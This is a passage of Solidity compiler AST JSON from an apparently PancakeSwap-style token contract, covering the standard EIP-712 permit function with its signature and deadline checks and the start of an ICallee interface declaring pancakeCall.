												"scope": 356,
												"src": "3161:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 309,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3161:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 312,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 356,
												"src": "3181:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 311,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3181:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3129:71:0"
									},
									"returnParameters": {
										"id": 316,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 315,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 356,
												"src": "3219:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 314,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3219:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3218:6:0"
									},
									"scope": 435,
									"src": "3108:361:0",
									"stateMutability": "nonpayable",
									"superFunction": 532,
									"visibility": "external"
								},
								{
									"body": {
										"id": 433,
										"nodeType": "Block",
										"src": "3658:781:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 377,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 374,
																"name": "deadline",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 364,
																"src": "3676:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 375,
																	"name": "block",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2346,
																	"src": "3688:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_block",
																		"typeString": "block"
																	}
																},
																"id": 376,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "timestamp",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3688:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3676:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a2045585049524544",
															"id": 378,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3705:18:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c94fedce6c17cde8c2120d29d390f27d6964b7aed2ab712d624019c41a3810c1",
																"typeString": "literal_string \"Pancake: EXPIRED\""
															},
															"value": "Pancake: EXPIRED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c94fedce6c17cde8c2120d29d390f27d6964b7aed2ab712d624019c41a3810c1",
																"typeString": "literal_string \"Pancake: EXPIRED\""
															}
														],
														"id": 373,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "3668:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 379,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3668:56:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 380,
												"nodeType": "ExpressionStatement",
												"src": "3668:56:0"
											},
											{
												"assignments": [
													382
												],
												"declarations": [
													{
														"constant": false,
														"id": 382,
														"name": "digest",
														"nodeType": "VariableDeclaration",
														"scope": 433,
														"src": "3734:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														},
														"typeName": {
															"id": 381,
															"name": "bytes32",
															"nodeType": "ElementaryTypeName",
															"src": "3734:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 404,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "1901",
																	"id": 386,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3808:10:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_301a50b291d33ce1e8e9064e3f6a6c51d902ec22892b50d58abf6357c6a45541",
																		"typeString": "literal_string \"\u0019\u0001\""
																	},
																	"value": "\u0019\u0001"
																},
																{
																	"argumentTypes": null,
																	"id": 387,
																	"name": "DOMAIN_SEPARATOR",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 35,
																	"src": "3836:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																},
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 391,
																					"name": "PERMIT_TYPEHASH",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 38,
																					"src": "3937:15:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"id": 392,
																					"name": "owner",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 358,
																					"src": "3978:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"id": 393,
																					"name": "spender",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 360,
																					"src": "4009:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"id": 394,
																					"name": "value",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 362,
																					"src": "4042:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"id": 398,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "++",
																					"prefix": false,
																					"src": "4073:15:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"baseExpression": {
																							"argumentTypes": null,
																							"id": 395,
																							"name": "nonces",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 42,
																							"src": "4073:6:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																								"typeString": "mapping(address => uint256)"
																							}
																						},
																						"id": 397,
																						"indexExpression": {
																							"argumentTypes": null,
																							"id": 396,
																							"name": "owner",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 358,
																							"src": "4080:5:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_address",
																								"typeString": "address"
																							}
																						},
																						"isConstant": false,
																						"isLValue": true,
																						"isPure": false,
																						"lValueRequested": true,
																						"nodeType": "IndexAccess",
																						"src": "4073:13:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"id": 399,
																					"name": "deadline",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 364,
																					"src": "4114:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					},
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					},
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					},
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 389,
																					"name": "abi",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2343,
																					"src": "3901:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_abi",
																						"typeString": "abi"
																					}
																				},
																				"id": 390,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"memberName": "encode",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "3901:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																					"typeString": "function () pure returns (bytes memory)"
																				}
																			},
																			"id": 400,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "3901:243:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes_memory_ptr",
																				"typeString": "bytes memory"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes_memory_ptr",
																				"typeString": "bytes memory"
																			}
																		],
																		"id": 388,
																		"name": "keccak256",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2350,
																		"src": "3870:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																			"typeString": "function (bytes memory) pure returns (bytes32)"
																		}
																	},
																	"id": 401,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3870:292:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_301a50b291d33ce1e8e9064e3f6a6c51d902ec22892b50d58abf6357c6a45541",
																		"typeString": "literal_string \"\u0019\u0001\""
																	},
																	{
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	},
																	{
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 384,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2343,
																	"src": "3774:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 385,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3774:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 402,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "3774:402:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 383,
														"name": "keccak256",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2350,
														"src": "3751:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
															"typeString": "function (bytes memory) pure returns (bytes32)"
														}
													},
													"id": 403,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3751:435:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3734:452:0"
											},
											{
												"assignments": [
													406
												],
												"declarations": [
													{
														"constant": false,
														"id": 406,
														"name": "recoveredAddress",
														"nodeType": "VariableDeclaration",
														"scope": 433,
														"src": "4196:24:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 405,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4196:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 413,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 408,
															"name": "digest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 382,
															"src": "4233:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														{
															"argumentTypes": null,
															"id": 409,
															"name": "v",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 366,
															"src": "4241:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														{
															"argumentTypes": null,
															"id": 410,
															"name": "r",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 368,
															"src": "4244:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														{
															"argumentTypes": null,
															"id": 411,
															"name": "s",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 370,
															"src": "4247:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															},
															{
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															},
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 407,
														"name": "ecrecover",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2348,
														"src": "4223:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_ecrecover_pure$_t_bytes32_$_t_uint8_$_t_bytes32_$_t_bytes32_$returns$_t_address_$",
															"typeString": "function (bytes32,uint8,bytes32,bytes32) pure returns (address)"
														}
													},
													"id": 412,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4223:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4196:53:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 423,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 419,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 415,
																	"name": "recoveredAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "4280:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 417,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "4308:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			}
																		],
																		"id": 416,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4300:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 418,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4300:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"src": "4280:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 422,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 420,
																	"name": "recoveredAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "4314:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 421,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 358,
																	"src": "4334:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "4314:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "4280:59:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e56414c49445f5349474e4154555245",
															"id": 424,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4353:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															},
															"value": "Pancake: INVALID_SIGNATURE"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															}
														],
														"id": 414,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "4259:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 425,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4259:132:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 426,
												"nodeType": "ExpressionStatement",
												"src": "4259:132:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 428,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 358,
															"src": "4410:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 429,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 360,
															"src": "4417:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 430,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 362,
															"src": "4426:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 427,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "4401:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 431,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4401:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 432,
												"nodeType": "ExpressionStatement",
												"src": "4401:31:0"
											}
										]
									},
									"documentation": null,
									"id": 434,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 371,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 358,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3500:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 357,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3500:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 360,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3523:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 359,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3523:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 362,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3548:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 361,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3548:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 364,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3571:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3571:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 366,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3597:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 365,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "3597:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 368,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3614:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 367,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3614:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 370,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3633:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 369,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3633:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3490:158:0"
									},
									"returnParameters": {
										"id": 372,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3658:0:0"
									},
									"scope": 435,
									"src": "3475:964:0",
									"stateMutability": "nonpayable",
									"superFunction": 718,
									"visibility": "external"
								}
							],
							"scope": 436,
							"src": "111:4330:0"
						}
					],
					"src": "36:4406:0"
				},
				"id": 0
			},
			"ICallee.sol": {
				"ast": {
					"absolutePath": "ICallee.sol",
					"exportedSymbols": {
						"ICallee": [
							449
						]
					},
					"id": 450,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 437,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:1"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 449,
							"linearizedBaseContracts": [
								449
							],
							"name": "ICallee",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"id": 448,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "pancakeCall",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 446,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 439,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "116:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 438,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "116:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 441,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "140:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 440,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "140:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
